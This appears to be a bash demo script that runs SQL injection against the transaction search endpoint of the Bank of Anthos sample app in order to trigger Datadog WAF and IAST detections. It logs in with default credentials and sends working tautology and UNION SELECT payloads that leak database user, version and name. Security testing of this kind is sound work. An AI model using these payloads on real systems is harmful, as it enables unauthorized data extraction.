#!/usr/bin/env bash
#
# SQL injection demo against /transactions/search on the Bank of Anthos
# frontend. The endpoint proxies to transactionhistory, where the
# `counterparty` query param is concatenated raw into a native SQL query —
# classic SQLi sink.
#
# What this exercises in Datadog AAP:
#   * WAF       — SQLi pattern in the query string (` OR `, UNION, comment)
#   * IAST      — tainted createNativeQuery() sink in TransactionSearchService
#   * Trace tag — usr.id=testuser set on the span, so "Block user" enforcement
#                 attributes the signal to a specific authenticated identity.
#
# Usage:
#   FRONTEND_URL=http://<frontend-ip> ./docs/sqli-attack.sh
#
# Requires: curl

set -euo pipefail

FRONTEND_URL="${FRONTEND_URL:-http://localhost:8080}"
USERNAME="${USERNAME:-testuser}"
PASSWORD="${PASSWORD:-bankofanthos}"

COOKIES=$(mktemp)
trap 'rm -f "${COOKIES}"' EXIT

echo "==> Target: ${FRONTEND_URL}"

echo
echo "==> Step 1: log in as ${USERNAME}"
LOGIN_CODE=$(curl -sS -o /dev/null -w "%{http_code}" \
    -c "${COOKIES}" \
    -X POST "${FRONTEND_URL}/login" \
    --data-urlencode "username=${USERNAME}" \
    --data-urlencode "password=${PASSWORD}")

if ! grep -q $'\ttoken\t' "${COOKIES}"; then
    echo "ERROR: login failed (HTTP ${LOGIN_CODE}); no token cookie returned." >&2
    exit 1
fi
echo "    Logged in (HTTP ${LOGIN_CODE})."

echo
echo "==> Step 2: benign search — counterparty=9999999999 (no such account)"
echo "    GET ${FRONTEND_URL}/transactions/search?counterparty=9999999999"
BENIGN=$(curl -sS -b "${COOKIES}" \
    --get "${FRONTEND_URL}/transactions/search" \
    --data-urlencode "counterparty=9999999999")
echo "    Response: ${BENIGN}"

echo
echo "==> Step 3: tautology SQLi — returns all of the user's transactions"
echo "    Payload: ' OR '1'='1"
TAUTOLOGY=$(curl -sS -b "${COOKIES}" \
    --get "${FRONTEND_URL}/transactions/search" \
    --data-urlencode "counterparty=' OR '1'='1")
echo "    Response (first 300 chars):"
printf '    %s\n' "${TAUTOLOGY:0:300}"

echo
echo "==> Step 4: UNION exfil — leaks Postgres metadata into the result set"
echo "    Payload: ') UNION SELECT NULL, current_user, NULL, current_database(), NULL, NULL, NULL--"
UNION_RESP=$(curl -sS -b "${COOKIES}" \
    --get "${FRONTEND_URL}/transactions/search" \
    --data-urlencode "counterparty=') UNION SELECT 1, current_user, version(), current_database(), NULL, now()--")
echo "    Response:"
printf '    %s\n' "${UNION_RESP}"

echo
echo "==> Done. In Datadog look for:"
echo "    * AAP signal: SQL injection on /transactions/{accountId}/search"
echo "    * Trace tag:  usr.id=${USERNAME}"
echo "    * IAST sink:  TransactionSearchService.searchByCounterparty"
